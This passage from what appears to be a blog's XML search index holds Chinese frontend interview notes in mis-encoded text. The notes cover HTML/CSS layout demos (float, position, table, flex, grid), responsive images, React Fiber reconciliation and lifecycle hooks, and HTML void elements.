è¢«æµ®åŠ¨å…ƒç´ è¦†ç›–ï¼ˆæ¸…é™¤æµ®åŠ¨ï¼ŒBFCç›’å­å†…ä¸å—å¤–éƒ¨æµ®åŠ¨å½±å“ï¼‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;float&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; background-color: black; &#125; .left&#123; height:300px; background-color:red; &#125; .right&#123; height:300px; background-color:yellow; &#125; .mid&#123; height:300px; background-color:blue; &#125; .top&#123; height:300px; background-color:green; &#125; .bottom&#123; height:300px; background-color:purple; &#125; .float .left&#123; width:300px; float:left; &#125; .float .right&#123; width:25%; float:right; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;div class=&quot;float&quot;&gt; &lt;div class=&quot;top&quot;&gt;&lt;/div&gt; &lt;div class=&quot;left&quot;&gt;FL&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;FR&lt;/div&gt; &lt;div class=&quot;mid&quot;&gt;FM&lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; å®šä½å¸ƒå±€position123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;position&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; background-color: black; &#125; .left&#123; height:300px; background-color:red; &#125; .right&#123; height:300px; background-color:yellow; &#125; .mid&#123; height:300px; background-color:blue; &#125; .top&#123; height:300px; background-color:green; &#125; .bottom&#123; height:300px; background-color:purple; &#125; .position .left&#123; width:300px; position: absolute; left:8px; &#125; .position .right&#123; width:25%; position: absolute; right:8px; &#125; .position .mid&#123; margin:0 25% 0 300px; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;div class=&quot;position&quot;&gt; &lt;div class=&quot;top&quot;&gt;&lt;/div&gt; &lt;div class=&quot;left&quot;&gt;PL&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;PR&lt;/div&gt; &lt;div class=&quot;mid&quot;&gt;PM&lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; è¡¨æ ¼å¸ƒå±€tableç¼ºç‚¹ï¼š tableæ¯”å…¶å®ƒhtmlæ ‡è®°å æ›´å¤šçš„å­—èŠ‚ã€‚(é€ æˆä¸‹è½½æ—¶é—´å»¶è¿Ÿ,å ç”¨æœåŠ¡å™¨æ›´å¤šæµé‡èµ„æº) tableä¼šé˜»æŒ¡æµè§ˆå™¨æ¸²æŸ“å¼•æ“Žçš„æ¸²æŸ“é¡ºåºã€‚(ä¼šå»¶è¿Ÿé¡µé¢çš„ç”Ÿæˆé€Ÿåº¦,è®©ç”¨æˆ·ç­‰å¾…æ›´ä¹…çš„æ—¶é—´) tableé‡Œæ˜¾ç¤ºå›¾ç‰‡æ—¶éœ€è¦ä½ æŠŠå•ä¸ªã€æœ‰é€»è¾‘æ€§çš„çš„å›¾ç‰‡åˆ‡æˆå¤šä¸ªå›¾ã€‚(å¢žåŠ è®¾è®¡çš„å¤æ‚åº¦,å¢žåŠ é¡µé¢åŠ è½½æ—¶é—´,å¢žåŠ httpä¼šè¯æ•°) åœ¨æŸäº›æµè§ˆå™¨ä¸­,tableé‡Œçš„æ–‡å­—çš„æ‹·è´ä¼šå‡ºçŽ°é—®é¢˜ã€‚(ä¼šè®©ç”¨æˆ·ä¸æ‚¦) tableä¼šå½±å“å…¶å†…éƒ¨çš„æŸäº›å¸ƒå±€å±žæ€§çš„ç”Ÿæ•ˆ(æ¯”å¦‚é‡Œçš„å…ƒç´ çš„height:100%) (é™åˆ¶é¡µé¢è®¾è®¡çš„è‡ªç”±æ€§) ä¸€æ—¦å­¦äº†CSSçš„çŸ¥è¯†,ä½ ä¼šå‘çŽ°ä½¿ç”¨tableåšé¡µé¢å¸ƒå±€ä¼šå˜å¾—æ›´éº»çƒ¦ã€‚(å…ˆèŠ±æ—¶é—´å­¦ä¸€äº›CSSçŸ¥è¯†,ä¼šçœåŽ»ä½ ä»¥åŽå¤§é‡çš„æ—¶é—´) â€˜tableå¯¹â€™å¯¹äºŽé¡µé¢å¸ƒå±€æ¥è¯´,ä»Žè¯­ä¹‰ä¸Šçœ‹æ˜¯ä¸æ­£ç¡®çš„ã€‚(å®ƒæè¿°çš„æ˜¯è¡¨çŽ°,è€Œä¸æ˜¯å†…å®¹) tableä»£ç ä¼šè®©é˜…è¯»è€…æŠ“ç‹‚ã€‚(ä¸ä½†æ— æ³•åˆ©ç”¨CSS,è€Œä¸”ä¼šä¸çŸ¥æ‰€äº‘,å°¤å…¶åœ¨è¿›è¡Œé¡µé¢æ”¹ç‰ˆæˆ–å†…å®¹æŠ½å–çš„æ—¶å€™) tableä¸€æ—¦è®¾è®¡å®Œæˆå°±å˜æˆæ­»çš„,å¾ˆéš¾é€šè¿‡CSSè®©å®ƒå±•çŽ°æ–°çš„é¢è²Œã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;table&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; background-color: black; &#125; .left&#123; height:300px; background-color:red; &#125; .right&#123; height:300px; background-color:yellow; &#125; .mid&#123; height:300px; background-color:blue; &#125; .top&#123; height:300px; background-color:green; &#125; .bottom&#123; height:300px; background-color:purple; &#125; table&#123; width:100%; &#125; table .left&#123; width:300px; &#125; table .mid&#123; margin:0 25%; &#125; table .right&#123; width:25%; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;table&gt; &lt;tr&gt; &lt;td class=&quot;top&quot; colspan=&quot;3&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;left&quot;&gt;TL&lt;/td&gt; &lt;td class=&quot;mid&quot;&gt;TM&lt;/td&gt; &lt;td class=&quot;right&quot;&gt;TR&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td class=&quot;bottom&quot; colspan=&quot;3&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; å¼¹æ€§å¸ƒå±€flexå¼¹æ€§å¸ƒå±€é‡ç‚¹åœ¨å•ä¸€æ¨ªæŽ’å’Œå•ä¸€ç«–æŽ’çš„æ ·å¼åº”ç”¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;flex&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; background-color: black; &#125; .left&#123; height:300px; background-color:red; &#125; .right&#123; height:300px; background-color:yellow; &#125; .mid&#123; height:300px; background-color:blue; &#125; .top&#123; height:300px; background-color:green; &#125; .bottom&#123; height:300px; background-color:purple; &#125; .flex&#123; display:flex; flex-direction: column; &#125; .flex .top,.flex .bottom&#123; flex:1; &#125; .flex .main&#123; display: flex; &#125; .flex .mid&#123; flex:1; &#125; .flex .left&#123; width:300px; min-width: 100px; &#125; .flex .right&#123; width:25%; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;div class=&quot;flex&quot;&gt; &lt;div class=&quot;top&quot;&gt;&lt;/div&gt; &lt;div class=&quot;main&quot;&gt; &lt;div class=&quot;left&quot;&gt;FL&lt;/div&gt; &lt;div class=&quot;mid&quot;&gt;FM&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;FR&lt;/div&gt; &lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; ç½‘æ ¼å¸ƒå±€gridgrid-areaæ˜¯åº”ç”¨çš„é‡ç‚¹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;grid&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body&#123; background-color: black; &#125; .left&#123; height:300px; background-color:red; &#125; .right&#123; height:300px; background-color:yellow; &#125; .mid&#123; height:300px; background-color:blue; &#125; .top&#123; height:300px; background-color:green; &#125; .bottom&#123; height:300px; background-color:purple; &#125; .top&#123; grid-area: top; &#125; .left&#123; grid-area: left; &#125; .mid&#123; grid-area: mid; &#125; .right&#123; grid-area: right; &#125; .bottom&#123; grid-area: bottom; &#125; .grid&#123; display: grid; grid-template-columns: 300px 3fr 1fr; grid-template-rows:auto; grid-template-areas: &quot;top top top&quot; &quot;left mid right&quot; &quot;bottom bottom bottom&quot; ; &#125; &lt;/style&gt; &lt;/head&gt;&lt;body&gt; &lt;div class=&quot;grid&quot;&gt; &lt;div class=&quot;top&quot;&gt;&lt;/div&gt; &lt;div class=&quot;left&quot;&gt;GL&lt;/div&gt; &lt;div class=&quot;mid&quot;&gt;GM&lt;/div&gt; &lt;div class=&quot;right&quot;&gt;GR&lt;/div&gt; &lt;div class=&quot;bottom&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; å“åº”å¼å¸ƒå±€å°±æ˜¯åˆ†åˆ«ä¸ºä¸åŒçš„å±å¹•è®¾è®¡çš„å¸ƒå±€æ–¹å¼ï¼Œå¯ä»¥ç†è§£æˆè‡ªé€‚åº”å¸ƒå±€å’Œæµç¨‹å¸ƒå±€çš„ç»“åˆã€‚ åª’ä½“æŸ¥è¯¢+å„ç±»æµå¼å¸ƒå±€ 12@media (max-width: 1200px) &#123;&#125; åœ¨å“åº”å¼ç¼–ç¨‹ä¸­ï¼Œæ¯”è¾ƒéš¾å¤„ç†çš„å°±æ˜¯å›¾ç‰‡ã€‚éœ€è¦é’ˆå¯¹ä¸åŒè®¾å¤‡çš„åˆ†è¾¨çŽ‡è¿›è¡Œé€‚é…ï¼ŒåŒæ—¶è¦ä¿æŒè¾ƒå¥½çš„å…¼å®¹æ€§ã€‚åœ¨å¤„ç†å›¾ç‰‡æ—¶ï¼Œæœ‰ä»¥ä¸‹çš„å°æŠ€å·§ï¼š ä¸ºå›¾åƒä½¿ç”¨ç›¸å¯¹å°ºå¯¸ï¼Œé˜²æ­¢å®ƒä»¬æ„å¤–æº¢å‡ºå®¹å™¨ã€‚ å¦‚æžœæ‚¨è¦æ ¹æ®è®¾å¤‡ç‰¹æ€§ï¼ˆäº¦ç§°è‰ºæœ¯æŒ‡å¯¼ï¼‰æŒ‡å®šä¸åŒå›¾åƒï¼Œåˆ™ä½¿ç”¨ picture å…ƒç´ ã€‚ åœ¨ img å…ƒç´ ä¸­ä½¿ç”¨ srcset åŠ x æè¿°ç¬¦ï¼Œå¼•å¯¼æµè§ˆå™¨ä»Žä¸åŒå¯†åº¦å›¾åƒä¸­é€‰æ‹©ã€ä½¿ç”¨æœ€ä½³çš„ä¸€å¼ ã€‚ å¦‚æžœæ‚¨çš„é¡µé¢ä»…æœ‰ä¸€ä¸¤ä¸ªå›¾åƒï¼Œä¸”è¿™äº›å›¾åƒæ²¡æœ‰åœ¨æ‚¨çš„ç½‘ç«™ä¸Šçš„å…¶ä»–åœ°æ–¹ä½¿ç”¨ï¼Œå¯è€ƒè™‘ä½¿ç”¨å†…è”å›¾åƒä»¥å‡å°‘æ–‡ä»¶è¯·æ±‚ã€‚ æˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªæ¥è¯´è¿™äº›æŠ€å·§ã€‚é¦–å…ˆæ˜¯ä¸ºå›¾åƒä½¿ç”¨ç›¸å¯¹å°ºå¯¸ï¼Œè·Ÿå‰é¢çš„ä¸ºå…ƒç´ ä½¿ç”¨ç›¸å¯¹å°ºå¯¸ä¸€æ ·ï¼Œé˜²æ­¢åœ¨å°å±å¹•è®¾å¤‡ä¸Šæº¢å‡ºå®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨ max-width: 100% æ¥ä¿è¯å›¾åƒåŠå…¶ä»–å†…å®¹ä¸ä¼šä»Žçˆ¶å®¹å™¨ä¸Šæº¢å‡ºã€‚åŒæ—¶ï¼Œä¸ºäº†æé«˜å¯è®¿é—®æ€§ï¼Œéœ€è¦ä¸ºimgå…ƒç´ æ·»åŠ æœ‰æ„ä¹‰çš„altæè¿°ã€‚ å…¶æ¬¡æ˜¯imgå…ƒç´ çš„srcsetå±žæ€§ï¼Œè¿™ä¸ªå±žæ€§éžå¸¸æœ‰ç”¨ï¼Œå¯ä»¥é’ˆå¯¹ä¸åŒè®¾å¤‡ç‰¹æ€§æä¾›å¤šç§å›¾ç‰‡æ–‡ä»¶ã€‚å¦‚æžœæµè§ˆå™¨æ”¯æŒsrcsetå±žæ€§ï¼Œåˆ™ä¼šåœ¨è¿›è¡Œä»»ä½•è¯·æ±‚ä¹‹å‰å¯¹é€—å·åˆ†éš”çš„å›¾åƒ/æ¡ä»¶åˆ—è¡¨è¿›è¡Œè§£æžï¼Œå¹¶ä¸”åªä¼šä¸‹è½½å’Œæ˜¾ç¤ºæœ€åˆé€‚çš„å›¾åƒã€‚åœ¨ä½¿ç”¨æ—¶ï¼Œä¸ºäº†èƒ½å¤Ÿå…¼å®¹ä¸æ”¯æŒsrcsetå±žæ€§çš„æµè§ˆå™¨ï¼Œè¿˜éœ€è¦ä¸ºimgå…ƒç´ æŒ‡å®šsrcã€‚å°±åƒä¸‹é¢è¿™æ ·ï¼š1&lt;img src=&quot;lighthouse.jpg&quot;srcset=&quot;lighthouse.jpg , lighthouse-2x.jpg 2x&quot;&gt; å¦ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„å…ƒç´ æ˜¯pictureï¼Œå…¶èƒ½æ ¹æ®è®¾å¤‡ç‰¹æ€§æ›´æ”¹å›¾åƒï¼Œpictureå…ƒç´ å®šä¹‰äº†ä¸€ä¸ªå£°æ˜Žæ€§è§£å†³åŠžæ³•ï¼Œå¯æ ¹æ®è®¾å¤‡å¤§å°ã€è®¾å¤‡åˆ†è¾¨çŽ‡ã€å±å¹•æ–¹å‘ç­‰ä¸åŒç‰¹æ€§æ¥æä¾›ä¸€ä¸ªå›¾åƒçš„å¤šä¸ªç‰ˆæœ¬ï¼Œå°±åƒvideoå…ƒç´ ä¸€æ ·ï¼Œå¯ä»¥æŒ‡å®šå¤šä¸ªæºã€‚ä¸ºäº†ä¿æŒå…¼å®¹ä»¥åŠé»˜è®¤çš„æƒ…å†µï¼Œè¿˜å¯ä»¥åœ¨pictureå…ƒç´ é‡Œé¢åµŒå¥—imgï¼Œéžå¸¸å¥½ç”¨ã€‚12345&lt;picture&gt; &lt;source media=&quot;(min-width: 800px)&quot; srcset=&quot;head.jpg, head-2x.jpg 2x&quot;&gt; &lt;source media=&quot;(min-width: 450px)&quot; srcset=&quot;head-small.jpg, head-small-2x.jpg 2x&quot;&gt; &lt;img src=&quot;head-fb.jpg&quot; srcset=&quot;head-fb-2x.jpg 2x&quot; alt=&quot;a head carved out of wood&quot;&gt;&lt;/picture&gt; åŒæ—¶ï¼Œåœ¨å¤„ç†å›¾ç‰‡æ—¶ï¼Œä¸ºäº†å‡å°‘è¯·æ±‚ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å†…è”å›¾ç‰‡èµ„æºã€‚å¸¸è§çš„æ–¹æ¡ˆæ˜¯base64åŠå†…è”SVGï¼Œå†…è”SVGé™¤äº†èƒ½å¤Ÿå‡å°‘è¯·æ±‚å¤–ï¼Œè¿˜èƒ½å¤Ÿä¿æŒé¡µé¢ç¼©æ”¾æ—¶ï¼Œå›¾ç‰‡ä¸å¤±çœŸã€‚]]></content>
      <categories>
        <category>FrontEnd</category>
      </categories>
      <tags>
        <tag>å‰ç«¯å¼€å‘</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_React%2F</url>
    <content type="text"><![CDATA[å‰è¨€ ç”Ÿå‘½å‘¨æœŸ React Fiber åœ¨React Fiberä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå½“Reactå†³å®šè¦åŠ è½½æˆ–è€…æ›´æ–°ç»„ä»¶æ ‘æ—¶ï¼Œä¼šåšå¾ˆå¤šäº‹ï¼Œä½†ä¸»è¦æ˜¯ä¸¤ä¸ªé˜¶æ®µï¼š è°ƒåº¦é˜¶æ®µï¼ˆReconcilerï¼‰ï¼šè¿™ä¸ªé˜¶æ®µReactç”¨æ–°æ•°æ®ç”Ÿæˆæ–°çš„Virtual DOMï¼ŒéåŽ†Virtual DOMï¼Œç„¶åŽé€šè¿‡Diffç®—æ³•ï¼Œå¿«é€Ÿæ‰¾å‡ºéœ€è¦æ›´æ–°çš„å…ƒç´ ï¼Œæ”¾åˆ°æ›´æ–°é˜Ÿåˆ—ä¸­åŽ»ã€‚ æ¸²æŸ“é˜¶æ®µï¼ˆRendererï¼‰ï¼šè¿™ä¸ªé˜¶æ®µReact æ ¹æ®æ‰€åœ¨çš„æ¸²æŸ“çŽ¯å¢ƒï¼ŒéåŽ†æ›´æ–°é˜Ÿåˆ—ï¼Œå°†å¯¹åº”å…ƒç´ æ›´æ–°ã€‚åœ¨æµè§ˆå™¨ä¸­ï¼Œå°±æ˜¯è·Ÿæ–°å¯¹åº”çš„DOMå…ƒç´ ã€‚é™¤æµè§ˆå™¨å¤–ï¼Œæ¸²æŸ“çŽ¯å¢ƒè¿˜å¯ä»¥æ˜¯ Nativeã€ç¡¬ä»¶ã€VR ã€WebGLç­‰ç­‰ã€‚ Reactä¹‹å‰çš„è°ƒåº¦ç­–ç•¥Stack Reconcilerã€‚è¿™ä¸ªç­–ç•¥åƒå‡½æ•°è°ƒç”¨æ ˆä¸€æ ·ï¼Œä¼šæ·±åº¦ä¼˜å…ˆéåŽ†æ‰€æœ‰çš„Virtual DOMèŠ‚ç‚¹ï¼Œè¿›è¡ŒDiffã€‚å®ƒä¸€å®šè¦ç­‰æ•´æ£µVirtual DOMè®¡ç®—å®Œæˆä¹‹åŽï¼Œæ‰å°†ä»»åŠ¡å‡ºæ ˆé‡Šæ”¾ä¸»çº¿ç¨‹ã€‚è€Œæµè§ˆå™¨ä¸­çš„æ¸²æŸ“å¼•æ“Žæ˜¯å•çº¿ç¨‹çš„ï¼Œé™¤äº†ç½‘ç»œæ“ä½œ,å‡ ä¹Žæ‰€æœ‰çš„æ“ä½œéƒ½åœ¨è¿™ä¸ªå•çº¿ç¨‹ä¸­æ‰§è¡Œï¼šè§£æžæ¸²æŸ“DOM treeå’ŒCSS treeã€è§£æžæ‰§è¡ŒJavaScriptï¼Œè¿™ä¸ªçº¿ç¨‹å°±æ˜¯æµè§ˆå™¨çš„ä¸»çº¿ç¨‹ã€‚ React Fiberè§£å†³è¿‡åŽ»Reconcilerå­˜åœ¨çš„é—®é¢˜çš„æ€è·¯æ˜¯æŠŠæ¸²æŸ“/æ›´æ–°è¿‡ç¨‹ï¼ˆé€’å½’diffï¼‰æ‹†åˆ†æˆä¸€ç³»åˆ—å°ä»»åŠ¡ï¼Œæ¯æ¬¡æ£€æŸ¥æ ‘ä¸Šçš„ä¸€å°éƒ¨åˆ†ï¼Œå®ŒæˆåŽç¡®è®¤å¦è¿˜æœ‰æ—¶é—´ç»§ç»­ä¸‹ä¸€ä¸ªä»»åŠ¡ï¼Œå­˜åœ¨æ—¶ç»§ç»­ï¼Œä¸å­˜åœ¨ä¸‹ä¸€ä¸ªä»»åŠ¡æ—¶è‡ªå·±æŒ‚èµ·ï¼Œä¸»çº¿ç¨‹ä¸å¿™çš„æ—¶å€™å†ç»§ç»­ã€‚ React Fiberå°†ç»„ä»¶çš„é€’å½’æ›´æ–°ï¼Œæ”¹æˆé“¾è¡¨çš„ä¾æ¬¡æ‰§è¡Œï¼Œæ‰©å±•å‡ºäº†fiber treeï¼Œå³Fiberä¸Šä¸‹æ–‡çš„Virtual DOM treeï¼Œæ›´æ–°è¿‡ç¨‹æ ¹æ®è¾“å…¥æ•°æ®ä»¥åŠçŽ°æœ‰çš„fiber treeæž„é€ å‡ºæ–°çš„fiber treeï¼ˆworkInProgress treeï¼‰ã€‚ fiber treeå®žé™…ä¸Šæ˜¯ä¸ªå•é“¾è¡¨ï¼ˆSingly Linked Listï¼‰æ ‘ç»“æž„ã€‚Fiberçš„æ‹†åˆ†å•ä½æ˜¯fiber treeä¸Šçš„ä¸€ä¸ªèŠ‚ç‚¹fiberï¼ŒæŒ‰Virtual DOMèŠ‚ç‚¹æ‹†ï¼Œå› ä¸ºfiber treeæ˜¯æ ¹æ®Virtual DOM treeæž„é€ å‡ºæ¥çš„ï¼Œæ ‘ç»“æž„ä¸€æ¨¡ä¸€æ ·ï¼Œåªæ˜¯èŠ‚ç‚¹æºå¸¦çš„ä¿¡æ¯æœ‰å·®å¼‚ã€‚æ‰€ä»¥ï¼Œå®žé™…ä¸ŠVirtual DOM nodeç²’åº¦çš„æ‹†åˆ†ä»¥fiberä¸ºå·¥ä½œå•å…ƒï¼Œæ¯ä¸ªç»„ä»¶å®žä¾‹å’Œæ¯ä¸ªDOMèŠ‚ç‚¹æŠ½è±¡è¡¨ç¤ºçš„å®žä¾‹éƒ½æ˜¯ä¸€ä¸ªå·¥ä½œå•å…ƒã€‚å·¥ä½œå¾ªçŽ¯ä¸­ï¼Œæ¯æ¬¡å¤„ç†ä¸€ä¸ªfiberï¼Œå¤„ç†å®Œå¯ä»¥ä¸­æ–­/æŒ‚èµ·æ•´ä¸ªå·¥ä½œå¾ªçŽ¯ã€‚ reconcile React FiberæŠŠæ¸²æŸ“/æ›´æ–°è¿‡ç¨‹åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š 1ï¼‰å¯ä¸­æ–­çš„render/reconciliation é€šè¿‡æž„é€ workInProgress treeå¾—å‡ºchangeã€‚ 2ï¼‰ä¸å¯ä¸­æ–­çš„commit åº”ç”¨è¿™äº›DOM changeã€‚ ç¬¬ä¸€é˜¶æ®µrender/reconciliationå…·ä½“å®žçŽ°ä¸ºä»¥fiber treeä¸ºè“æœ¬ï¼ŒæŠŠæ¯ä¸ªfiberä½œä¸ºä¸€ä¸ªå·¥ä½œå•å…ƒï¼Œè‡ªé¡¶å‘ä¸‹é€èŠ‚ç‚¹æž„é€ workInProgress treeï¼ˆæž„å»ºä¸­çš„æ–°fiber treeï¼‰ã€‚ ä»¥ç»„ä»¶èŠ‚ç‚¹ä¸ºä¾‹ï¼Œå…·ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š 1ï¼‰å¦‚æžœå½“å‰èŠ‚ç‚¹ä¸éœ€è¦æ›´æ–°ï¼Œç›´æŽ¥æŠŠå­èŠ‚ç‚¹cloneè¿‡æ¥ï¼Œè·³åˆ°5ï¼›è¦æ›´æ–°çš„è¯æ‰“ä¸ªtagã€‚ 2ï¼‰æ›´æ–°å½“å‰propsï¼Œ stateï¼Œ contextç­‰èŠ‚ç‚¹çŠ¶æ€ã€‚ 3ï¼‰è°ƒç”¨should Component Update()ï¼Œfalseçš„è¯ï¼Œè·³åˆ°5ã€‚ 4ï¼‰è°ƒç”¨render()èŽ·å¾—æ–°çš„å­èŠ‚ç‚¹ï¼Œå¹¶ä¸ºå­èŠ‚ç‚¹åˆ›å»ºfiberã€‚åˆ›å»ºè¿‡ç¨‹ä¼šå°½é‡å¤ç”¨çŽ°æœ‰fiberï¼Œå­èŠ‚ç‚¹å¢žåˆ ä¹Ÿå‘ç”Ÿåœ¨è¿™é‡Œã€‚ 5ï¼‰å¦‚æžœæ²¡æœ‰äº§ç”Ÿchild fiberï¼Œè¯¥å·¥ä½œå•å…ƒç»“æŸï¼ŒæŠŠeffect listå½’å¹¶åˆ°returnï¼Œå¹¶æŠŠå½“å‰èŠ‚ç‚¹çš„siblingä½œä¸ºä¸‹ä¸€ä¸ªå·¥ä½œå•å…ƒï¼›å¦åˆ™æŠŠchildä½œä¸ºä¸‹ä¸€ä¸ªå·¥ä½œå•å…ƒã€‚ 6ï¼‰å¦‚æžœæ²¡æœ‰å‰©ä½™å¯ç”¨æ—¶é—´äº†ï¼Œç­‰åˆ°ä¸‹ä¸€æ¬¡ä¸»çº¿ç¨‹ç©ºé—²æ—¶æ‰å¼€å§‹ä¸‹ä¸€ä¸ªå·¥ä½œå•å…ƒï¼›å¦åˆ™ï¼Œç«‹å³å¼€å§‹åšã€‚ 7ï¼‰å¦‚æžœæ²¡æœ‰ä¸‹ä¸€ä¸ªå·¥ä½œå•å…ƒäº†ï¼Œå›žåˆ°äº†workInProgress treeçš„æ ¹èŠ‚ç‚¹ï¼Œç¬¬1é˜¶æ®µç»“æŸï¼Œè¿›å…¥pending CommitçŠ¶æ€ã€‚ å®žé™…ä¸Šæ˜¯1-&gt;6çš„å·¥ä½œå¾ªçŽ¯ï¼Œ7æ˜¯å‡ºå£ï¼Œå·¥ä½œå¾ªçŽ¯æ¯æ¬¡åªåšä¸€ä»¶äº‹ï¼Œåšå®Œçœ‹è¦ä¸è¦ä¼‘æ¯ã€‚å·¥ä½œå¾ªçŽ¯ç»“æŸæ—¶ï¼Œå› ä¸ºæ¯åšå®Œä¸€ä¸ªéƒ½å‘ä¸Šå½’å¹¶ï¼ŒworkInProgress treeæ ¹èŠ‚ç‚¹èº«ä¸Šçš„effect listå°±æ˜¯æ”¶é›†åˆ°çš„æ‰€æœ‰side effectã€‚ æ‰€ä»¥ï¼Œæž„å»ºworkInProgress treeçš„è¿‡ç¨‹å°±æ˜¯diffçš„è¿‡ç¨‹ï¼Œé€šè¿‡request Idle Callbackæ¥è°ƒåº¦æ‰§è¡Œä¸€ç»„ä»»åŠ¡ï¼Œæ¯å®Œæˆä¸€ä¸ªä»»åŠ¡åŽå›žæ¥çœ‹çœ‹æœ‰æ²¡æœ‰æ’é˜Ÿçš„ï¼ˆæ›´ç´§æ€¥çš„ï¼‰ï¼Œæ¯å®Œæˆä¸€ç»„ä»»åŠ¡ï¼ŒæŠŠæ—¶é—´æŽ§åˆ¶æƒäº¤è¿˜ç»™ä¸»çº¿ç¨‹ï¼Œç›´åˆ°ä¸‹ä¸€æ¬¡request Idle Callbackå›žè°ƒå†ç»§ç»­æž„å»ºworkInProgress treeã€‚ è¿™ä¸€é˜¶æ®µæ˜¯æ²¡æœ‰å‰¯ä½œç”¨çš„ï¼Œå› æ­¤è¿™ä¸ªè¿‡ç¨‹å¯ä»¥è¢«æ‰“æ–­ï¼Œç„¶åŽæ¢å¤æ‰§è¡Œã€‚ ç¬¬äºŒé˜¶æ®µcommitï¼šç¬¬ä¸€é˜¶æ®µäº§ç”Ÿçš„effectliståªæœ‰åœ¨commitä¹‹åŽæ‰ä¼šç”Ÿæ•ˆï¼Œä¹Ÿå°±æ˜¯çœŸæ­£åº”ç”¨åˆ°DOMä¸­ã€‚è¿™ä¸€é˜¶æ®µå¾€å¾€ä¸ä¼šæ‰§è¡Œå¤ªé•¿æ—¶é—´ï¼Œå› æ­¤æ˜¯åŒæ­¥ï¼ˆæ‰€è°“çš„ä¸€æ¬¡æ€§ï¼‰çš„ï¼Œè¿™æ ·ä¹Ÿé¿å…äº†ç»„ä»¶å†…è§†å›¾å±‚ç»“æž„å’ŒDOMä¸ä¸€è‡´ã€‚ ç”Ÿå‘½å‘¨æœŸ å› ä¸ºrender/reconciliationé˜¶æ®µå¯èƒ½æ‰§è¡Œå¤šæ¬¡ï¼Œä¼šå¯¼è‡´willXXXé’©å­æ‰§è¡Œå¤šæ¬¡ã€‚æ‰€ä»¥getDerivedStateFromPropså–ä»£äº†åŽŸæœ¬çš„componentWillMountä¸ŽcomponentWillReceivePropsæ–¹æ³•ï¼Œè€ŒcomponentWillUpdateæœ¬æ¥å°±æ˜¯å¯æœ‰å¯æ— æ‰€ä»¥ä¹Ÿè¢«åºŸå¼ƒäº†ã€‚ è¿›å…¥commité˜¶æ®µæ—¶ï¼Œç»„ä»¶å¤šäº†ä¸€ä¸ªæ–°é’©å­å«getSnapshotBeforeUpdateï¼Œå®ƒä¸Žcommité˜¶æ®µçš„é’©å­ä¸€æ ·åªæ‰§è¡Œä¸€æ¬¡ã€‚ å‡ºé”™æ—¶ï¼Œåœ¨componentDidMount/UpdateåŽï¼Œå¯ä»¥ä½¿ç”¨componentDidCatchæ–¹æ³•ã€‚ HOChttps://zhuanlan.zhihu.com/p/49485308 https://zhuanlan.zhihu.com/p/39992552]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2017%2F12%2F16%2Finterview_html%2F</url>
    <content type="text"><![CDATA[å‰è¨€ zibi 123456789101112131415&lt;meta/&gt; å¤´éƒ¨å…ƒç´ &lt;base/&gt; æ ‡ç­¾ä¸ºé¡µé¢ä¸Šçš„æ‰€æœ‰é“¾æŽ¥è§„å®šé»˜è®¤åœ°å€æˆ–é»˜è®¤ç›®æ ‡ã€‚&lt;br/&gt; æ¢è¡Œ&lt;hr/&gt; åˆ†éš”çº¿&lt;area/&gt; æ ‡ç­¾å®šä¹‰å›¾åƒæ˜ å°„ä¸­çš„åŒºåŸŸ(æ³¨:å›¾åƒæ˜ å°„æŒ‡å¾—æ˜¯å¸¦æœ‰å¯ç‚¹å‡»åŒºåŸŸçš„å›¾åƒ)ã€‚area å…ƒç´ æ€»æ˜¯åµŒå¥—åœ¨ æ ‡ç­¾ä¸­&lt;img/&gt; å›¾ç‰‡&lt;input&gt; è¾“å…¥æ¡†&lt;link/&gt; é“¾æŽ¥&lt;param/&gt; æ’å…¥ XHTML æ–‡æ¡£çš„å¯¹è±¡è§„å®š run-time è®¾ç½®&lt;col/&gt; è¡¨æ 